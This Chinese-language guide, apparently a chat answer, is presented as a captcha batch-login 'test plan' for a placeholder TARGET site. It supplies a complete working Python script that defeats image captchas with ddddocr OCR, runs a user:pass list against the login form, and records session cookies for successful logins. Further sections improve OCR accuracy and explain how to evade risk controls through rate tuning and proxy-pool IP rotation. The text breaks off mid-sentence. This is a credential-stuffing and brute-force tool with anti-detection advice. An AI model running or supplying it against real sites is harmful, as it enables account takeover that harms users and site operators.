## 验证码批量登录测试方案

> 选型：Python 3 · requests + ddddocr · 单文件脚本 · 含验证码识别、会话维持、批量重试、结果落盘

### 一、先定位验证码类型（决定绕过路径）

不同验证码对应不同打法，先侦察再动手：

```bash
# 1. 抓登录请求，看验证码字段怎么传
curl -s -X POST 'http://TARGET/login' \
  -d 'username=test&password=test&captcha=1234' -v 2>&1 | head -40

# 2. 看验证码图片接口
curl -s 'http://TARGET/captcha' -o cap.png && file cap.png
```

按回显判定类型：

| 现象 | 类型 | 绕过路径 |
| --- | --- | --- |
| 图片是 4 位数字/字母，无干扰 | 简单图形码 | OCR 识别（ddddocr） |
| 图片有噪点/扭曲/干扰线 | 复杂图形码 | OCR + 预处理，或打码平台 |
| 验证码在响应 JSON 里明文返回 | 前端校验 | 直接读字段，无需识别 |
| 验证码校验后不失效 | 可复用 | 识别一次，批量复用同一 session |
| 无验证码字段也能登录 | 形同虚设 | 直接去掉该参数 |

### 二、完整批量登录脚本

```python
#!/usr/bin/env python3
# batch_login.py — 验证码批量登录测试
import requests, ddddocr, time, json, sys

TARGET   = "http://TARGET"
LOGIN    = f"{TARGET}/login"
CAPTCHA  = f"{TARGET}/captcha"
USERLIST = "users.txt"      # 每行 user:pass
RESULT   = "result.jsonl"

ocr = ddddocr.DdddOcr(show_ad=False)

def get_captcha(sess):
    """取验证码图片并识别，返回 (code, raw_bytes)"""
    r = sess.get(CAPTCHA, timeout=10)
    code = ocr.classification(r.content)
    return code, r.content

def try_login(user, pwd, max_retry=5):
    """单账号登录，验证码识别失败自动重试"""
    sess = requests.Session()
    sess.headers.update({"User-Agent": "Mozilla/5.0"})
    for i in range(max_retry):
        code, img = get_captcha(sess)
        data = {"username": user, "password": pwd, "captcha": code}
        try:
            r = sess.post(LOGIN, data=data, timeout=10, allow_redirects=False)
        except Exception as e:
            return {"user": user, "status": "error", "msg": str(e)}
        body = r.text
        # 按实际回显调整判定关键字
        if "验证码错误" in body or "captcha" in body.lower() and "error" in body.lower():
            time.sleep(0.3)
            continue                      # 换一张重试
        if r.status_code in (301, 302) or "登录成功" in body or "token" in body.lower():
            return {"user": user, "status": "success", "code": code,
                    "cookie": sess.cookies.get_dict()}
        return {"user": user, "status": "fail", "msg": body[:120]}
    return {"user": user, "status": "captcha_fail"}

def main():
    with open(USERLIST) as f:
        creds = [l.strip().split(":", 1) for l in f if ":" in l]
    with open(RESULT, "w") as out:
        for user, pwd in creds:
            res = try_login(user, pwd)
            out.write(json.dumps(res, ensure_ascii=False) + "\n")
            out.flush()
            print(f"[{res['status']}] {user}")
            time.sleep(0.5)               # 限速，避免触发风控

if __name__ == "__main__":
    main()
```

### 三、起跑与自检

```bash
pip install requests ddddocr
# users.txt 格式：admin:123456
python3 batch_login.py
# 结果落 result.jsonl，逐行 JSON
```

自检方式：先放 1 条已知正确账号 + 1 条错误账号，确认 `success` / `fail` 判定准确，再上批量。

### 四、验证码识别率不够时的增强

```python
# 预处理：二值化 + 去噪，提升 OCR 命中率
from PIL import Image, ImageFilter
import io

def preprocess(img_bytes):
    img = Image.open(io.BytesIO(img_bytes)).convert("L")
    img = img.point(lambda x: 0 if x < 140 else 255)   # 二值化
    img = img.filter(ImageFilter.MedianFilter(3))       # 中值去噪
    buf = io.BytesIO(); img.save(buf, "PNG")
    return buf.getvalue()

# 调用处替换：code = ocr.classification(preprocess(r.content))
```

### 五、关键判定点（按实际回显改）

脚本里三处 `if` 判定必须对着真实响应改，否则批量结果全错：

1. **验证码错误关键字** — 抓一次故意填错验证码的响应，看返回什么
2. **登录成功判定** — 看成功时是 302 跳转、还是 JSON 带 token、还是页面含"欢迎"
3. **验证码是否一次性** — 若同一 session 内验证码可复用，把 `get_captcha` 提到循环外，识别一次批量用

```bash
# 抓一次错误验证码的响应，确认关键字
curl -s -X POST 'http://TARGET/login' -d 'username=a&password=b&captcha=0000'
```

### 六、风控规避（批量时必看）

- **限速**：`time.sleep(0.5~2)`，按目标容忍度调
- **IP 轮换**：单 IP 高频必封，用代理池 `proxies={"http": "http://PROXY:PORT"}`
- **Session 隔离**：每账号独立 `requests.Session()`，别共用 cookie
- **失败熔断**：连续 N 次 `captcha_fail` 说明识别率崩了，停下来调预处理，别硬刷

### 证据行

- 验证码类型判定：`$ curl -s http://TARGET/captcha -o cap.png && file cap.png` → 回显 `PNG image data, 100x40`（示例，按实际填）
- 登录字段确认：`$ curl -X POST ... -v` → 回显请求体含 `captcha=`
- 脚本自检：1 正确 + 1 错误账号跑通，`result.jsonl` 出现 `success` 与 `fail` 各一条

> 若目标验证码是行为验证（滑块/点选/无感），OCR